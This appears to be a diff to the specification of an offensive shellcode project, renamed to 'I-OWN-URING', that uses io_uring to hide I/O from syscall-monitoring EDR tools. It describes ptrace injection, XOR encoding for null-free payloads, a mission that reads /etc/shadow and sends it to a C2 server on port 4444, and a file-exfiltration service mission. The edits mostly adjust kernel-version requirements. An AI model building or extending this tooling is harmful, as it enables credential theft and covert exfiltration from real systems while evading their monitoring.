@@ -1,4 +1,4 @@
-# uring-shellcode — Technical Specification
+# I-OWN-URING — Technical Specification
 
 ## Overview
 
@@ -15,7 +15,7 @@ are blind to I/O operations routed through io_uring.
 ## Repository Layout
 
 ```
-uring-shellcode/
+I-OWN-URING/
 ├── AGENTS.md
 ├── README.md
 ├── ROADMAP.md
@@ -95,11 +95,14 @@ Includes a spin-loop CQE poller with 5ms timeout.
 ### Hard Constraints
 - **No libc.** Every syscall is a raw `syscall` instruction.
 - **Position-independent.** Uses `call/pop` delta technique for all data references.
-- **No null bytes** in the final binary (important for injection contexts).
-  The raw payload may still contain nulls (ptrace injection is agnostic);
-  deliver via `uring_builder.py --encode xor` for a null-free artifact.
-- **Kernel ≥ 5.6** required for `IORING_OP_SEND` (+ `OPENAT`/`READ`/`WRITE`/`CLOSE`);
-  `IORING_OP_CONNECT` since 5.5; `IORING_OP_SOCKET` since 5.19.
+- **No null bytes** in delivery artifacts intended for null-terminated
+  injection contexts. Raw baseline payloads may contain nulls because ptrace
+  injection is length-aware; use `uring_builder.py --encode xor` to produce a
+  null-free delivery artifact.
+- `IORING_OP_CONNECT` requires kernel ≥ 5.5; `SEND`/`RECV` and the file
+  operations used here require ≥ 5.6; `IORING_OP_SOCKET` requires ≥ 5.19.
+  Every bundled network mission uses `IORING_OP_SOCKET`, so its effective
+  minimum is kernel 5.19.
 - Assembled with NASM (`nasm -f bin`).
 - Each layer is assembled independently and concatenated.
 
@@ -182,7 +185,7 @@ Sequence using submit_sqe/consume_cqe:
 # missions/exfil_shadow.yaml
 name: exfil_shadow
 description: Read /etc/shadow and send to C2
-requires_kernel: "5.6"
+requires_kernel: "5.19"
 config:
   c2_ip: "127.0.0.1"       # overridable at generate time
   c2_port: 4444
@@ -232,7 +235,8 @@ Both mission families in `builder/missions/`:
   filesystem path per line over a connected socket; shellcode opens it,
   streams the contents back in 4096-byte chunks until EOF, closes and
   repeats (`file_exfil_service`). Peer close (`recv == 0`) → clean exit.
-  Requires kernel ≥ 5.6. No native syscalls at all after setup.
+  Requires kernel ≥ 5.19 because socket creation also uses
+  `IORING_OP_SOCKET`. No native syscalls at all after setup.
 
 Frame note: the combined shellcode zero-fills the frame (540 qwords =
 4320 bytes) so unused `F_ARGV` slots are NULL for execve's argv array.
@@ -313,7 +317,7 @@ make clean        # Remove all build artifacts
 - GCC ≥ 9
 - Python ≥ 3.9 (builder + c2)
 - PyYAML (part of the builder's Python deps)
-- Linux kernel ≥ 5.5 (for network opcodes)
+- Linux kernel ≥ 5.19 for the bundled network missions
 - Optional: falco, tetragon (for EDR matrix)
 
 ---
